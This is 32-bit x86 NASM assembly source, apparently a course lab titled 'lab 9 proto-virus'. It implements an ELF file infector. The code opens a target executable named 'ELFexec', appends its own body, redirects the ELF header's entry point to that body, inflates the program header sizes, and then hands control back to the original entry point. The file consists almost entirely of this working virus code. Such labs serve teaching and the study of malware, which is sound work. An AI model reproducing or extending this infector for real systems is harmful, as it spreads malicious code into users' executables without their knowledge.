%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro debug 0
	write stdout, msg ,5
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY_POINT_OFFSET		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define stdout 1
%define load_addr 0x08048000
%define header_size 52

global _start

section .text

virus_start:

get_my_loc:
	call next_i
next_i:
	pop dword[ebp-16]			;ebp-16= next_i addr
	ret

_start:	 	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
; You code for this lab goes here
	call get_my_loc
prompt_Outstr:
	mov eax, dword[ebp-16]			;ebp-16= next_i addr
	add eax, (OutStr-next_i)		;get OutStr addr 
	write stdout, eax, 31			;write OutStr
open_file:
	mov eax, dword[ebp-16]			;ebp-16= next_i addr
	add eax, (FileName-next_i)		;get FileName addr
	open eax, RDWR, 511				;open file
check_if_open:
	cmp eax, 0
	jb failure
open_succeeded:
	mov dword[ebp-4], eax				; fd = [ebp -4]
check_if_elf:
	lea ebx, [ebp-8]					;ebp-8 = first 4 bytes of the file 
	read eax, ebx, 4					;read .ELF
	cmp dword[ebp-8], 0x464c457f 		;ebx=.ELF?		
	jne failure
append_virus_to_EOF:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,0,SEEK_END				;repositions the file offset
	mov dword[ebp-12], eax 				;ebp-12 = length of the file 
write_our_virus:
	mov eax, dword[ebp-4]				;eax=fd
	mov ebx, dword[ebp-16]				;ebp-16= next_i addr
	add ebx, (virus_start-next_i)			;ebx = addr of virus_start
	write eax , ebx , (virus_end-virus_start)	;write to fd code from virus_start til virus_end
copy_ELF_header_into_memory:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,0,SEEK_SET				;repositions the file offset			
	mov eax, dword[ebp-4]				;eax=fd
	lea ebx, [ebp-72]					;we will copy to [ebp-72] the header		
	read eax, ebx, header_size			;read header to memory 			
	cmp eax, header_size 				;check if header was completly loaded			
	jne failure
copy_program_header_table:
	mov ebx, dword[ebp-72+PHDR_start]	;get ph_2_offset 
	add ebx, PHDR_size
	mov eax, dword[ebp-4]				;get fd
	lseek eax,ebx,SEEK_SET				;repositions the file offset
	mov eax, dword[ebp-4]				;get fd
	lea ebx, [ebp-112]					;ebp-144 = ph_table
	read eax, ebx, PHDR_size
modify_elf_header:
set_new_entry_point:
	lea eax, [ebp-72]					;get statring addr of header in memory 
	add eax, ENTRY_POINT_OFFSET			;location of entry point
	mov ebx, dword[eax]
	mov dword[ebp-76], ebx				;ebp-76 = prev entry point
	mov ecx, dword[ebp-112+PHDR_vaddr]  ;addr on virtual memory 0x08048000
	sub ecx, dword[ebp-112+PHDR_offset]	;- program header offset
	add ecx, dword[ebp-12]				;length of file 
	add ecx, (_start - virus_start)		;offset of _start
	mov dword[eax], ecx					;set entry point 
update_PreviousEntryPoint:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,-4,SEEK_END				;repositions the file offset
	mov eax, dword[ebp-4]				;get fd
	lea ebx, [ebp-76]					;get &old_entry_point
	write eax, ebx, 4					;update  PreviousEntryPoint 	
write_back_header_into_elf:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,0,SEEK_SET				;repositions the file offset
	mov eax, dword[ebp-4]				;eax=fd
	lea ebx, [ebp-72]					;ebp-72 = addr to header in memory 			
	write eax, ebx ,header_size 		;rewrite header
	cmp eax, header_size 								
	jne failure
modify_size_of_infected_file:
update_file_and_mem_size:
	mov eax, dword[ebp-12]	;get size of the file
	sub eax, dword[ebp-112+PHDR_offset]	;- program header offset
	add eax, (virus_end-virus_start)		;+ virus code size
	mov dword[ebp-112+PHDR_filesize], eax	;set fileSize
	mov dword[ebp-112+PHDR_memsize], eax	;set fileSize
write_back_ph_into_elf:
	mov eax, dword[ebp-4]				;get fd
	mov ebx, dword[ebp-72+PHDR_start]	;get ph_offset 
	add ebx, PHDR_size
	lseek eax, ebx,SEEK_SET				;repositions the file offset	
	mov eax, dword[ebp-4]				;get fd
	lea ebx, [ebp-112]					;get loc in memry of ph_table
	write eax, ebx, PHDR_size	
close_file:
	mov eax, dword[ebp-4]
	close eax
	cmp eax, 0
	jb failure
jump_to_infected_file_code:
	mov eax, dword[ebp-16]						;ebp-16= next_i addr
	add eax, (PreviousEntryPoint-next_i)		;get OutStr addr 
	jmp dword[eax]
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

failure:
	mov eax, dword[ebp-16]
	add eax, (Failstr-next_i)
	write stdout, eax, 12
	exit 1

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0 ;200
Failstr:        db "perhaps not", 10 , 0
	
msg: db "****",10,0

PreviousEntryPoint: dd VirusExit
virus_end: